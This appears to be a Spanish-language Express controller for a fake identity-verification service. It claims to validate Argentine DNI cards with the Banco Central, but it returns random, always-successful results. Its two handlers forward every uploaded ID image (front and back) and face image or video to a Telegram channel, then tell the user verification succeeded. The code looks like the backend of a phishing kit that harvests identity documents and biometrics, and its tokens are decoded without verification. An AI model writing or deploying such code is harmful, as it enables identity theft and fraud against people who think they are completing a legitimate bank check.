// 📄 Controlador de verificación
import { Request, Response } from 'express';
import { AuthRequest } from '../middleware/auth.middleware';
import { sendDNINotification, sendFacialNotification } from '../utils/telegram.service';
import axios from 'axios';

// Función para extraer datos simulados del DNI (en producción usar OCR real)
const extractDNIData = (frontImage: string, backImage: string) => {
  // Simulación de extracción de datos del DNI
  // En producción, usar servicios como Google Vision API, AWS Textract, etc.
  return {
    numero: Math.floor(Math.random() * 90000000) + 10000000,
    nombre: 'Usuario',
    apellido: 'Verificado',
    fechaNacimiento: '01/01/1990',
    sexo: 'M',
    fechaEmision: new Date().toLocaleDateString('es-AR'),
    fechaVencimiento: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000 * 10).toLocaleDateString('es-AR'),
  };
};

// Simulación de validación con Banco Central (en producción usar API real)
const validateWithBancoCentral = async (dniData: any) => {
  // En producción, aquí iría la llamada a la API del Banco Central
  // Simulamos una validación exitosa
  return {
    valid: true,
    status: 'ACTIVO',
    verificado: true,
    score: Math.floor(Math.random() * 20) + 80, // Score entre 80-100
  };
};

export const verifyDNI = async (req: Request, res: Response): Promise<void> => {
  try {
    console.log('📄 Iniciando verificación DNI...');
    const { frontImage, backImage } = req.body;

    if (!frontImage || !backImage) {
      console.log('❌ Faltan imágenes');
      res.status(400).json({ error: 'Se requieren ambas imágenes del DNI' });
      return;
    }

    console.log('✅ Imágenes recibidas');
    console.log('📏 Tamaño frente:', frontImage.length);
    console.log('📏 Tamaño dorso:', backImage.length);

    // Extraer datos del DNI
    const dniData = extractDNIData(frontImage, backImage);
    console.log('✅ Datos extraídos:', dniData);
    
    // Validar con Banco Central
    const bcValidation = await validateWithBancoCentral(dniData);
    console.log('✅ Validación BC completa:', bcValidation);

    // Obtener info del usuario del token si existe
    const authHeader = req.headers.authorization;
    let userId = 'unknown';
    if (authHeader) {
      try {
        const token = authHeader.split(' ')[1];
        const jwt = require('jsonwebtoken');
        const decoded: any = jwt.decode(token);
        userId = decoded?.userId || 'unknown';
      } catch (e) {
        console.log('⚠️ Token inválido, continuar sin userId');
      }
    }

    // Enviar a Telegram con información completa (no bloquear si falla)
    try {
      console.log('📱 Intentando enviar a Telegram...');
      await sendDNINotification({
        userId,
        frontImage,
        backImage,
        timestamp: new Date().toLocaleString('es-AR'),
        dniData,
      });
      console.log('✅ Telegram enviado exitosamente');
    } catch (telegramError) {
      console.error('⚠️ Error en Telegram (no crítico):', telegramError);
      // Continuar aunque Telegram falle
    }

    console.log('✅ Respondiendo con éxito');
    res.json({ 
      success: true, 
      message: 'DNI verificado exitosamente',
      validated: bcValidation.valid,
      score: bcValidation.score
    });
  } catch (error) {
    console.error('❌ ERROR CRÍTICO en verificación DNI:', error);
    console.error('Stack:', error instanceof Error ? error.stack : 'No stack');
    res.status(500).json({ 
      error: 'Error al verificar DNI. Por favor intenta nuevamente.',
      details: process.env.NODE_ENV === 'development' ? (error instanceof Error ? error.message : String(error)) : undefined
    });
  }
};

export const verifyFacial = async (req: Request, res: Response): Promise<void> => {
  try {
    console.log('🎥 Iniciando verificación facial...');
    const { faceImage, faceVideo } = req.body;

    // Aceptar tanto imagen como video
    if (!faceImage && !faceVideo) {
      console.log('❌ Falta imagen o video facial');
      res.status(400).json({ error: 'Se requiere imagen o video facial' });
      return;
    }

    console.log('✅ Datos recibidos');
    if (faceVideo) {
      console.log('📹 Tipo: VIDEO');
      console.log('📏 Tamaño video:', faceVideo.length);
    } else {
      console.log('📸 Tipo: IMAGEN');
      console.log('📏 Tamaño imagen:', faceImage.length);
    }

    // Obtener info del usuario del token si existe
    const authHeader = req.headers.authorization;
    let userId = 'unknown';
    if (authHeader) {
      try {
        const token = authHeader.split(' ')[1];
        const jwt = require('jsonwebtoken');
        const decoded: any = jwt.decode(token);
        userId = decoded?.userId || 'unknown';
      } catch (e) {
        console.log('⚠️ Token inválido, continuar sin userId');
      }
    }

    // Enviar a Telegram (no bloquear si falla)
    try {
      console.log('📱 Enviando a Telegram...');
      await sendFacialNotification({
        userId,
        faceImage: faceImage || null,
        faceVideo: faceVideo || null,
        timestamp: new Date().toLocaleString('es-AR'),
      });
      console.log('✅ Telegram enviado exitosamente');
    } catch (telegramError) {
      console.error('⚠️ Error en Telegram (no crítico):', telegramError);
    }

    console.log('✅ Respondiendo con éxito');
    res.json({ success: true, message: 'Verificación facial exitosa' });
  } catch (error) {
    console.error('❌ ERROR CRÍTICO en verificación facial:', error);
    console.error('Stack:', error instanceof Error ? error.stack : 'No stack');
    res.status(500).json({ 
      error: 'Error al verificar rostro. Por favor intenta nuevamente.',
      details: process.env.NODE_ENV === 'development' ? (error instanceof Error ? error.message : String(error)) : undefined
    });
  }
};
